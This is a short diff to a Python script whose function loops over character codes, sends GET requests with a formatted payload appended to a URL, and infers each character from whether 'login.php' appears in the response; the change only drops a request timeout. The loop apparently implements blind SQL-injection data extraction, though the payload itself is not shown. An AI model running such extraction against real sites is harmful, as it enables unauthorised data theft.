@@ -12,7 +12,7 @@ def fun(url,result,result2):
     # 
         for i in range(result2):
             print(i)
-            reponse=requests.get(url+data.format(result,i),timeout=1)
+            reponse=requests.get(url+data.format(result,i))
             if 'login.php' in reponse.text:
                 print(result,chr(i)+"\n")
                 break
